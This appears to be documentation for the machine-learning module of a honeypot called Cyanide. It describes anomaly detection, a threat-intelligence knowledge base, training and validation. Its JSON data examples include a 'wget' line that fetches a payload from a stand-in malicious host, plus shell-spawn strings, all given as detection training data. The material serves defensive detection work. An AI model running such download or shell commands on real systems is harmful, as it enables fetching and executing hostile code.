# Machine Learning Documentation

Cyanide uses a dedicated ML module (`cyanideML`) to filter traffic, detect anomalies, and benchmark performance.

## ml-models/cyanideML

### `model.py`
**Class:** `HoneypotFilter`
The main ML model wrapper.
*   **Parameters:** `n_clusters`, `batch_size`.
*   **Logic:** Uses online K-Means clustering (MiniBatchKMeans) to learn "normal" traffic patterns.
*   **Functions:**
    *   `process_log(log_entry)`: Returns `(is_anomaly, reason, distance)`.
    *   `_update_threshold()`: Dynamically adjusts the anomaly threshold using statistical analysis (IQR) of recent distances.

### `feature_extractor.py`
**Class:** `FeatureExtractor`
Converts raw log entries into numerical feature vectors.
*   **Features:**
    *   Text Hashing (HashingVectorizer on command/username/input).
    *   Port usage (One-hot encoding of top ports).
    *   Entropy analysis (Shannon entropy of strings).
    *   Shell metacharacter counts.

### `knowledge_base.py`
**Class:** `KnowledgeBase`
Stores and searches threat intelligence data.
*   **Functions:**
    *   `add_entry(source, content, metadata)`: Add threat intelligence entry.
    *   `search(query)`: Search for matching entries using TF-IDF similarity.
    *   `save(path)`: Persist knowledge base to disk.
    *   `load(path)`: Load knowledge base from disk.

### Training the Knowledge Base

The knowledge base is trained on threat intelligence data from multiple sources:

#### Data Sources
*   **MITRE ATT&CK**: Tactics, techniques, and procedures (TTPs)
*   **CVE Database**: Common vulnerabilities and exposures
*   **ExploitDB**: Exploit patterns and signatures
*   **Hacker Methods**: Common attack patterns and command sequences

#### Training Process

1. **Prepare Training Data**
   Place your training data in the following directories:
   ```
   data/ml_training/hacker_methods/  - Attack pattern files
   data/ml_training/kb_ready/        - MITRE/CVE/ExploitDB data
   ```

2. **Run Training Script**
   ```bash
   python3 src/cyanide/ml/cyanideML/train_kb.py
   ```

3. **Training Configuration**
   The training script will:
   *   Load all JSON/text files from training directories
   *   Extract relevant features (commands, patterns, signatures)
   *   Build TF-IDF vectorizer for similarity search
   *   Save the trained knowledge base to `knowledge_base.pkl`

4. **Verify Training**
   ```bash
   python3 src/cyanide/ml/cyanideML/test_kb.py
   ```

#### Data Format

Training data should be in JSON format:
```json
{
  "source": "MITRE",
  "id": "T1059.004",
  "name": "Command and Scripting Interpreter: Unix Shell",
  "description": "Adversaries may abuse Unix shell commands...",
  "examples": ["bash -i", "sh -c", "/bin/sh"]
}
```

Or for exploit patterns:
```json
{
  "source": "ExploitDB",
  "pattern": "wget http://malicious.com/payload.sh",
  "category": "remote_download",
  "risk": "high"
}
```

### `validate_model.py`
Basic validation script.
*   **Function:** `validate()`
*   Runs a test against `var/log/cyanide/cyanide_synthetic.json` (if available) to calculate Accuracy, Precision, Recall, and F1 Score by mixing normal logs with generated random anomalies.

### `validate_advanced.py`
Advanced validation scenarios.
*   Generates complex attack patterns (SQLi, obfuscated shell commands, reverse shells).
*   Tests the model's ability to distinguish subtle attacks from normal administrative behavior.

### `benchmark.py`
Performance testing script.
*   Measures latency per log (Target < 1ms).
*   Tracks memory usage and throughput.
